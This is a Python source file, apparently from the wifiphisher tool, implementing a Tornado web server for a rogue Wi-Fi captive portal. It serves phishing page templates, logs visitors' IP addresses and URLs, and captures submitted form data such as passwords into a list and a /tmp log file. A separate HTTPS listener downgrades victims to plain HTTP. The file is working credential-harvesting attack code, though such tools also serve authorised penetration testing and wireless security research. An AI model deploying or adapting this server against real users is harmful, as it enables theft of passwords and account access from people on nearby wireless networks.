import logging
import tornado.ioloop
import tornado.web
import os.path
from wifiphisher.common.constants import *

hn = logging.NullHandler()
hn.setLevel(logging.DEBUG)
logging.getLogger('tornado.access').disabled = True
logging.getLogger('tornado.general').disabled = True

template = False
terminate = False
creds = []


class DowngradeToHTTP(tornado.web.RequestHandler):

    def get(self):
        self.redirect("http://10.0.0.1:8080/")


class ValidateHandler(tornado.web.RequestHandler):

    def initialize(self, em):
        self.em = em

    def get(self, cred_type, cred_content):
        """
        Override the get method

        :param self: A tornado.web.RequestHandler object
        :type self: tornado.web.RequestHandler
        :return: None
        :rtype: None
        """
        value = self.em.verify_cred((cred_type, cred_content))
        self.write("%s" % value)


class CaptivePortalHandler(tornado.web.RequestHandler):

    def get(self):
        """
        Override the get method

        :param self: A tornado.web.RequestHandler object
        :type self: tornado.web.RequestHandler
        :return: None
        :rtype: None
        """

        requested_file = self.request.path[1:]
        template_directory = template.get_path()

        # choose the correct file to serve
        if os.path.isfile(template_directory + requested_file):
            render_file = requested_file
        else:
            render_file = "index.html"

        # load the file
        file_path = template_directory + render_file
        self.render(file_path, **template.get_context())

        log_file_path = "/tmp/wifiphisher-webserver.tmp"
        with open(log_file_path, "a+") as log_file:
            log_file.write("GET request from {0} for {1}\n".format(
                self.request.remote_ip, self.request.full_url()))

    def post(self):
        """
        Override the post method

        :param self: A tornado.web.RequestHandler object
        :type self: tornado.web.RequestHandler
        :return: None
        :rtype: None
        ..note: we only serve the Content-Type which starts with
        "application/x-www-form-urlencoded" as a valid post request
        """

        global terminate

        # check if this is a valid phishing post request
        if self.request.headers["Content-Type"].startswith(VALID_POST_CONTENT_TYPE):

            post_data = tornado.escape.url_unescape(self.request.body)
            # log the data
            log_file_path = "/tmp/wifiphisher-webserver.tmp"
            with open(log_file_path, "a+") as log_file:
                log_file.write("POST request from {0} with {1}\n".format(
                    self.request.remote_ip, post_data))

            creds.append(post_data)
            terminate = True


def runHTTPServer(ip, port, ssl_port, t, em):
    global template
    template = t
    app = tornado.web.Application(
        [
            (r"/validate/([^/]+)/([^/]+)", ValidateHandler, {"em": em}),
            (r"/.*", CaptivePortalHandler)
        ],
        template_path=template.get_path(),
        static_path=template.get_path_static(),
        compiled_template_cache=False
    )
    app.listen(port, address=ip)

    ssl_app = tornado.web.Application(
        [
            (r"/.*", DowngradeToHTTP)
        ]
    )
    https_server = tornado.httpserver.HTTPServer(ssl_app, ssl_options={
        "certfile": PEM,
        "keyfile": PEM,
    })
    https_server.listen(ssl_port, address=ip)

    tornado.ioloop.IOLoop.instance().start()
